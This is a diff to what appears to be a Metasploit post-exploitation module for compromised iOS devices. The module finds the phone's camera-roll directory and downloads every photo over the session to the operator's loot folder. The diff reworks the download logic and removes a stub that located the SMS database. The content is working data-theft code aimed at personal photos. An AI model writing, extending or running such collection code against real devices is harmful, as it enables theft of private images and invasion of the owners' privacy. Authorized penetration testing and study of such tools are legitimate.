@@ -27,41 +27,27 @@ class MetasploitModule < Msf::Post
 
   def enum_img
     img_path = '/private/var/mobile/Media/DCIM/100APPlE'
+    path = File.join(Msf::Config.loot_directory, Rex::Text.rand_text_alpha(6))
+    local_path = File.expand_path(path)
+
     unless check_for_img_path
       print_bad('Default image path not found')
       return
     end
 
+    opts = { "block_size" => 4000 }
     print_good('Image path found. Will begin searching for images...')
-    ios_imgs = dir(img_path)
+    cd('/private/var/mobile')
+    cd('Media/DCIM/100APPLE')
+    ios_imgs = dir(pwd)
+    print_status("Directory for iOS images: #{local_path}")
     ios_imgs.each do |img|
-      begin
-        f = File.open("#{img_path}/#{img}")
-        data = File.read(f)
-        store_loot("ios_image", "image/jpg", session, data, img)
-        print_good("Stored #{img}")
-      rescue
-        print_bad('Failed to read and collect images')
-      end
+      print_status("Downloading image: #{img}")
+      client.fs.file.download_file("#{local_path}/#{img}", "#{pwd}/#{img}", opts)
     end
-  end
-
-  # location of texts: /private/var/mobile/Library/SMS/sms.db
-  def check_for_sms
-    file?('/private/var/mobile/Library/SMS/sms.db')
-  end
-
-  def enum_text
-    unless check_for_sms
-      print_bad('No text messages found')
-      return
-    end
-
-    print_good('Text message file found')
   end
 
   def run
     enum_img
-    enum_text
   end
 end
